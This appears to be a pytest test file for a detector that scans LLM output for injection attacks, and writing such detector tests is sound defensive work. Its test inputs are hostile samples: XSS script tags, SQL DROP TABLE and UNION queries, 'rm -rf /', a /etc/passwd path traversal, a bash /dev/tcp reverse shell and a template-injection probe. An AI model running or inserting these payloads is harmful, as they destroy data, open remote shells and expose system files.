"""Tests for the OutputHandlingPlugin (LLM05)."""
import pytest
from apps.security_engine.plugins.output_handling import (
    OutputHandlingPlugin,
    _calculate_risk_score,
    _classify_injection_type,
    _classify_threat_level,
    _generate_remediation,
)
from apps.security_engine.results import DetectionDetail
from apps.security_engine.exceptions import InvalidTargetError


class TestOutputHandlingPlugin:
    @pytest.fixture
    def plugin(self):
        return OutputHandlingPlugin()

    def test_metadata(self, plugin):
        meta = plugin.metadata
        assert meta.module_type == 'output_handling'
        assert meta.name == 'Output Handler Validator'

    def test_clean_output(self, plugin):
        result = plugin.scan('The capital of France is Paris.')
        assert result.risk_score == 0
        assert not result.summary['has_injection']

    def test_script_tag(self, plugin):
        result = plugin.scan('<script>alert("xss")</script>')
        assert result.risk_score > 60
        assert result.summary['has_injection'] is True

    def test_sql_union_select(self, plugin):
        result = plugin.scan('SELECT * FROM users UNION SELECT * FROM admins')
        assert result.risk_score > 50
        assert result.summary['has_injection'] is True

    def test_drop_table(self, plugin):
        result = plugin.scan('DROP TABLE users')
        assert result.risk_score > 60
        assert result.findings[0].severity == 'high'

    def test_rm_command(self, plugin):
        result = plugin.scan('rm -rf /')
        assert result.risk_score > 60
        assert result.summary['has_injection'] is True

    def test_path_traversal(self, plugin):
        result = plugin.scan('/etc/passwd via ../../../etc/passwd')
        assert result.risk_score > 50
        assert result.summary['has_injection'] is True

    def test_javascript_protocol(self, plugin):
        result = plugin.scan('<a href="javascript:alert(1)">click</a>')
        assert result.risk_score > 60
        assert result.summary['has_injection'] is True

    def test_reverse_shell(self, plugin):
        result = plugin.scan('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
        assert result.risk_score > 70
        assert result.findings[0].severity in ('critical', 'high')

    def test_django_ssti(self, plugin):
        result = plugin.scan('{{ config.__class__.__init__.__globals__ }}')
        assert result.risk_score > 50
        assert result.summary['has_injection'] is True

    def test_multiple_injection_types(self, plugin):
        result = plugin.scan(
            '<script>document.cookie</script>\n'
            'DROP TABLE users;\n'
            'rm -rf /home/\n'
        )
        assert result.risk_score > 70
        assert len(result.summary['detection_counts']) > 0
        assert result.summary['has_injection'] is True

    def test_empty_target(self, plugin):
        with pytest.raises(InvalidTargetError):
            plugin.scan('')


class TestHelperFunctions:
    def test_risk_score_empty(self):
        assert _calculate_risk_score([]) == 0.0

    def test_classify_empty(self):
        assert _classify_injection_type([]) == 'none'

    def test_classify_xss(self):
        detections = [DetectionDetail(type='xss_script_tag', description='test', confidence=0.90)]
        assert _classify_injection_type(detections) == 'xss'

    def test_classify_sql(self):
        detections = [DetectionDetail(type='sql_injection_drop_table', description='test', confidence=0.90)]
        assert _classify_injection_type(detections) == 'sql_injection'

    def test_remediation_exists(self):
        for itype in ['xss', 'command_injection', 'sql_injection',
                       'path_traversal', 'template_injection', 'none']:
            assert len(_generate_remediation(itype, [])) > 0
